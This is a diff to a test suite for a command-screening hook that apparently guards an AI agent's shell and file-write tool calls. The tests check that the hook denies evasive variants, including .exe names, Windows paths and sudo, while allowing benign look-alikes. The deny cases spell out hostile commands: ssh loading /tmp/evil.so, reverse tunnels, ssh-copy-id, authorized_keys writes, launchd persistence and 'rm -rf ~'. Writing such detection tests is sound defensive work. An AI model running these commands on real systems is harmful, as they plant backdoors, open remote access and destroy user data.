@@ -87,6 +87,27 @@ describe("persistence and tunnel rules: shell forms", () => {
     ["ssh -o PKCS11Provider=/tmp/evil.so host", "ssh-code-loading-option"],
     ["ssh -oSecurityKeyProvider=/tmp/x.so host", "ssh-code-loading-option"],
     ["ssh -I /tmp/evil.so host", "ssh-code-loading-option"],
+    ["ssh -I/tmp/evil.so host", "ssh-code-loading-option"],
+    ["ssh host -I /tmp/evil.so", "ssh-code-loading-option"],
+    ["ssh -fNI /tmp/evil.so host", "ssh-code-loading-option"],
+    ["/usr/bin/ssh -I /tmp/evil.so host", "ssh-code-loading-option"],
+    ["sudo ssh -I /tmp/evil.so host", "ssh-code-loading-option"],
+    // Windows command names: a trailing .exe (any case) does not hide the command (Git Bash, WSL interop, PowerShell).
+    ["ssh.exe -I /tmp/e.so host", "ssh-code-loading-option"],
+    ["SSH.EXE -I lib host", "ssh-code-loading-option"],
+    ["/c/Windows/System32/OpenSSH/ssh.exe -I /tmp/e.so host", "ssh-code-loading-option"],
+    ["/mnt/c/Windows/System32/OpenSSH/ssh.EXE -o PKCS11Provider=/tmp/e.so host", "ssh-code-loading-option"],
+    ["scp.exe -o PKCS11Provider=/tmp/e.so a b", "ssh-code-loading-option"],
+    ["sudo.exe ssh.exe -I /tmp/e.so host", "ssh-code-loading-option"],
+    ["'C:\\Windows\\System32\\OpenSSH\\ssh.exe' -I /tmp/e.so host", "ssh-code-loading-option"],
+    ["'C:\\Windows\\System32\\OpenSSH\\SSH.EXE' -R 9000:localhost:22 host", "ssh-reverse-forward"],
+    ["ssh.exe -R 9000:localhost:22 host", "ssh-reverse-forward"],
+    ["ssh.exe -w 0:0 host", "ssh-tunnel-device"],
+    ["ssh-copy-id.exe -i k.pub deploy@203.0.113.7", "ssh-copy-id"],
+    ["rm.exe -rf ~", "rm-recursive-home-or-system"],
+    ["RM.EXE -rf ~", "rm-recursive-home-or-system"],
+    ["env.exe rm -rf ~", "rm-recursive-home-or-system"],
+    ["bash.exe -c 'rm -rf ~'", "rm-recursive-home-or-system"],
     ["curl -O https://x.example/.zshrc", "shell-rc-download-append"],
   ])("denies %s (%s)", (cmd, rule) => {
     expect(bash(cmd)).toBe(rule);
@@ -117,6 +138,12 @@ describe("persistence and tunnel rules: shell forms", () => {
     // Security review round 4: the same shapes without the harm.
     "ssh -o PKCS11Provider=none host", "ssh -o SecurityKeyProvider= host", "ssh -o \"StrictHostKeyChecking=no\" host",
     "ssh -o 'ProxyCommand=\"ssh -W %h:%p bastion\"' host", "curl -O --output-dir /tmp/dl https://x.example/readme.md",
+    // -I is the PKCS#11 library option only for ssh: python3 -I is isolated mode, gcc -I is an include folder.
+    "python3 -I script.py", "python3 -I -c 'print(1)'", "gcc -I /usr/local/include -o app main.c",
+    // The same with a .exe name: still not the ssh option, still not harmful.
+    "python.exe -I script.py", "python3.exe -I -c 'print(1)'", "gcc.exe -I /usr/local/include -o app main.c",
+    "ssh.exe -N -L 8080:localhost:80 dev.example.com", "ssh.exe -o PKCS11Provider=none host", "rm.exe -rf ./build",
+    "echo ssh.exe -I /tmp/e.so host",
   ])("allows %s", (cmd) => {
     expect(bash(cmd)).toBeUndefined();
   });
@@ -181,6 +208,7 @@ describe("kya hook (spawn e2e): persistence and tunnel rules", () => {
       const cases: [string, string][] = [
         [bashPayload("echo k >> ~/.ssh/authorized_keys"), "ssh-authorized-keys-write"],
         [bashPayload("ssh -R 9000:localhost:22 host"), "ssh-reverse-forward"],
+        [bashPayload("ssh.exe -I /tmp/evil.so host"), "ssh-code-loading-option"],
         [bashPayload("launchctl load ~/Library/LaunchAgents/x.plist"), "persistence-launchd"],
         [writePayload("Write", { file_path: "/Users/it/Library/LaunchAgents/com.x.plist", content: "" }), "persistence-launchd"],
       ];
@@ -193,11 +221,13 @@ describe("kya hook (spawn e2e): persistence and tunnel rules", () => {
       }
     }, 60000);
 
-    it(`${host}: allows crontab -l, launchctl list, a normal ssh tunnel and a Write to a source file (exit 0, no output)`, () => {
+    it(`${host}: allows crontab -l, launchctl list, a normal ssh tunnel, python3 -I and a Write to a source file (exit 0, no output)`, () => {
       const cases = [
         bashPayload("crontab -l"),
         bashPayload("launchctl list"),
         bashPayload("ssh -N -L 8080:localhost:80 dev.example.com"),
+        bashPayload("python3 -I script.py"),
+        bashPayload("python.exe -I script.py"),
         writePayload("Write", { file_path: "/p/src/index.ts", content: "export {}" }),
       ];
       for (const stdin of cases) {
